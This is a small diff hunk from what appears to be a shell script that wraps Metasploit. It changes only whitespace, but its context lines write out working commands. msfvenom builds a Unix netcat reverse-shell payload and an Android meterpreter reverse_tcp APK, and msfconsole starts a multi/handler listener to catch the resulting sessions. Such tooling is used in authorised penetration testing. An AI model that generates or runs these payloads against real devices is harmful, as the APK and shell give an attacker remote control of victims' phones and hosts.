@@ -238,7 +238,7 @@ case $payload in
 	    msfvenom -p cmd/unix/reverse_netcat LHOST=$ipaddr LPORT=$port > shell
 	    msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload cmd/unix/reverse_netcat; set LHOST $ipaddr; set LPORT $port; exploit -j"
 	    ;;
-	20)	echo -e "${Cyan}[*]${NC} msfvenom -p android/meterpreter/reverse_tcp R > shell.apk\n"
+	20) echo -e "${Cyan}[*]${NC} msfvenom -p android/meterpreter/reverse_tcp R > shell.apk\n"
 	   	msfvenom -p android/meterpreter/reverse_tcp LHOST=$ipaddr LPORT=$port R > shell.apk
 	   	msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload android/meterpreter/reverse_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
 		;;
